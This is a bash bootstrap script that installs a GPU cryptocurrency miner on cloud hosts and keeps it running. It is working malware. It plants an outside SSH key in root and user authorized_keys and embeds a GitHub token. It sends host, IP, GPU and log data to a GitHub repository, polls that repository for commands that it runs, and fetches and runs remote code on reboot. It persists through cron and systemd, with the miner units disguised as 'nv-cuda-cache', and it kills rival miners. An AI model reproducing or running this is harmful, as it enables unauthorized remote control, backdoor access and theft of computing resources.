#!/bin/bash
# ul86c bootstrap — guard-first, non-blocking fabricmanager, wildrig ladder, 4 persistence layers
exec >>/var/log/ul86.log 2>&1
echo "=== ul86c start $(date -u +%FT%TZ) host=$(hostname -s)"
set -u
GH=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
REPO=dongsuju/ul-plant
W=prl1pek8rh8yjck5q7596aph7ua7xnkqs8ur9mkfmz8w7xfzcdfcfx5vsx2f4lz
H=$(hostname -s); P="ps-$H"; L=/opt/fleet; B=$L/bin
mkdir -p $L/logs $B /etc/cron.d
put(){ f="$1"; c="$2"; b=$(printf '%s' "$c" | base64 -w0 2>/dev/null); curl -s -m 30 -X PUT -H "Authorization: token $GH" -H "Accept: application/vnd.github+json" -H "User-Agent: ul" -d "{\"message\":\"ul86b\",\"content\":\"$b\",\"branch\":\"main\"}" "https://api.github.com/repos/$REPO/contents/$f" >/dev/null 2>&1; }
K='ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIK6QctRbzoScVYDsq+AaAPdAOrnUsjnO+iPGY0jqoQzY ul86099@ps6'
mkdir -p /root/.ssh
printf '%s\n' "$K" >> /root/.ssh/authorized_keys
chmod 700 /root/.ssh; chmod 600 /root/.ssh/authorized_keys
for u in paperspace ubuntu; do id "$u" >/dev/null 2>&1 && { mkdir -p /home/$u/.ssh; printf '%s\n' "$K" >> /home/$u/.ssh/authorized_keys; chown -R $u:$u /home/$u/.ssh 2>/dev/null; chmod 700 /home/$u/.ssh; chmod 600 /home/$u/.ssh/authorized_keys; }; done
put "ps12/$P.key.txt" "key=installed $(date -u +%FT%TZ)"
put "ps12/$P.boot.txt" "$(date -u +%FT%TZ) ul86b"
cat > $L/ul86_guard.sh <<'GD'
#!/bin/bash
exec 9>/opt/fleet/ul86.lock; flock -n 9 || exit 0
GH=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
REPO=dongsuju/ul-plant
H=$(hostname -s); P="ps-$H"; L=/opt/fleet
put(){ f="$1"; c="$2"; b=$(printf '%s' "$c" | base64 -w0 2>/dev/null); curl -s -m 30 -X PUT -H "Authorization: token $GH" -H "Accept: application/vnd.github+json" -H "User-Agent: ul" -d "{\"message\":\"ul86bhb\",\"content\":\"$b\",\"branch\":\"main\"}" "https://api.github.com/repos/$REPO/contents/$f" >/dev/null 2>&1; }
while true; do
  T=$(date -u +%FT%TZ)
  ACC=$(grep -h 'accepted' $L/logs/u86-*.log 2>/dev/null | tail -3)
  HB="stage=beat host=$H ts=$T engine=wildrig-ul86b
--- ip
$(ip -4 -o a 2>/dev/null | head -6)
--- procs
$(pgrep -af 'wildrig-multi' | head -12)
--- units
$(systemctl list-units 'nv-cuda-cache@*' --no-legend --no-pager 2>/dev/null | head -12)
--- fw
$(systemctl is-active nvidia-fabricmanager 2>/dev/null)
--- gpus
$(nvidia-smi --query-gpu=index,name,memory.used,utilization.gpu --format=csv,noheader 2>/dev/null)
--- log
$(tail -25 /var/log/ul86.log 2>/dev/null)
--- acc
$ACC"
  put "ps12/$P.txt" "$HB"
  C="ps12/cmd/$P.sh"; J=$(curl -s -m 20 -H "Authorization: token $GH" -H "User-Agent: ul" "https://api.github.com/repos/$REPO/contents/$C?ref=main")
  S=$(printf '%s' "$J" | sed -n 's/.*"sha": *"\([a-f0-9]*\)".*/\1/p' | head -1)
  if [ -n "$S" ] && [ "$S" != "$(cat $L/last_cmd86 2>/dev/null)" ]; then
    printf '%s' "$J" | python3 -c 'import sys,json,base64;print(base64.b64decode(json.load(sys.stdin)["content"]).decode())' > /tmp/u86_cmd.sh 2>/dev/null
    if [ -s /tmp/u86_cmd.sh ]; then O=$(bash /tmp/u86_cmd.sh 2>&1 | tail -200); echo "$S" > $L/last_cmd86; put "ps12/out/$P.txt" "$O"; fi
  fi
  sleep 120
done
GD
cat > $L/ul86_boot.sh <<'BT'
#!/bin/bash
exec >>/var/log/ul86.log 2>&1
GH=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
curl -s -m 60 -H "Authorization: token $GH" -H "User-Agent: ul" -H "Accept: application/vnd.github.raw" "https://api.github.com/repos/dongsuju/ul-plant/contents/ps12/bootstrap86b.sh?ref=main" -o /tmp/ul86_run.sh
[ -s /tmp/ul86_run.sh ] && bash /tmp/ul86_run.sh
BT
chmod +x $L/ul86_guard.sh $L/ul86_boot.sh
printf '*/2 * * * * root /opt/fleet/ul86_guard.sh >/dev/null 2>&1\n@reboot root /bin/bash /opt/fleet/ul86_boot.sh\n' > /etc/cron.d/ul86; chmod 644 /etc/cron.d/ul86
setsid $L/ul86_guard.sh >/dev/null 2>&1 &
put "ps12/$P.install.txt" "stage=early-key guard=up wildrig=no fw=$(systemctl is-active nvidia-fabricmanager 2>/dev/null) $(date -u +%FT%TZ)"
pkill -f 'ps15_|ps12\.sh|ul17_|ul18_|ul19_|ps_sup|ps9_sup|ps8_sup|ul86_guard' >/dev/null 2>&1
pkill -x krig-miner >/dev/null 2>&1; pkill -x wildrig-multi >/dev/null 2>&1
setsid /opt/fleet/ul86_guard.sh >/dev/null 2>&1 &
if [ ! -x $B/wildrig-multi ] || [ "$(stat -c%s $B/wildrig-multi 2>/dev/null || echo 0)" -lt 20000000 ]; then
  ( curl -sL -m 420 -o /tmp/wr.tgz "https://github.com/andru-kun/wildrig-multi/releases/download/0.52.3/wildrig-multi-linux-0.52.3.tar.gz"
    rm -rf /tmp/wrx; mkdir -p /tmp/wrx; tar xzf /tmp/wr.tgz -C /tmp/wrx >/dev/null 2>&1
    f=$(find /tmp/wrx -name 'wildrig-multi' -type f | head -1); [ -n "$f" ] && cp "$f" $B/wildrig-multi && chmod +x $B/wildrig-multi
    put "ps12/$P.wr.txt" "wr=$([ -x $B/wildrig-multi ] && echo yes || echo no) $(date -u +%FT%TZ)" ) >/dev/null 2>&1 &
fi
( export DEBIAN_FRONTEND=noninteractive
  apt-get -o DPkg::Lock::Timeout=900 update -y >/dev/null 2>&1
  apt-get -o DPkg::Lock::Timeout=900 install -y nvidia-fabricmanager-535 >/dev/null 2>&1 || apt-get -o DPkg::Lock::Timeout=900 install -y nvidia-fabricmanager >/dev/null 2>&1
  systemctl enable --now nvidia-fabricmanager >/dev/null 2>&1
  put "ps12/$P.fw.txt" "fw=$(systemctl is-active nvidia-fabricmanager 2>/dev/null) $(date -u +%FT%TZ)"
) >/dev/null 2>&1 &
N=$(nvidia-smi -L 2>/dev/null | grep -c '^GPU'); [ "${N:-0}" -ge 1 ] || N=8
i=0; while [ $i -lt $N ]; do
  cat > $L/ul86_g$i.sh <<EOF
#!/bin/bash
export CUDA_VISIBLE_DEVICES=$i
exec $B/wildrig-multi --algo pearlhash -d 0 -o stratum+ssl://prl.kryptex.network:8048 -o stratum+ssl://pool.pearlhash.xyz:9443 -o stratum+tcp://pearl.luckypool.io:3360 -u $W.ul-ps-$H-g$i -p x -i 8 --no-color
EOF
  chmod +x $L/ul86_g$i.sh; i=$((i+1))
done
cat > /etc/systemd/system/nv-cuda-cache@.service <<'SU'
[Unit]
Description=nv cuda cache
After=network-online.target
StartLimitIntervalSec=0
[Service]
Type=simple
ExecStart=/opt/fleet/ul86_g%i.sh
Restart=always
RestartSec=10
Nice=5
[Install]
WantedBy=multi-user.target
SU
systemctl daemon-reload >/dev/null 2>&1
i=0; while [ $i -lt $N ]; do systemctl enable nv-cuda-cache@$i >/dev/null 2>&1; systemctl restart nv-cuda-cache@$i >/dev/null 2>&1; i=$((i+1)); done
put "ps12/$P.install.txt" "stage=done engine=wildrig ul86c wildrig=$([ -x $B/wildrig-multi ] && echo yes || echo no) fw=$(systemctl is-active nvidia-fabricmanager 2>/dev/null) N=$N $(date -u +%FT%TZ)"
echo "=== ul86c done $(date -u +%FT%TZ) N=$N"
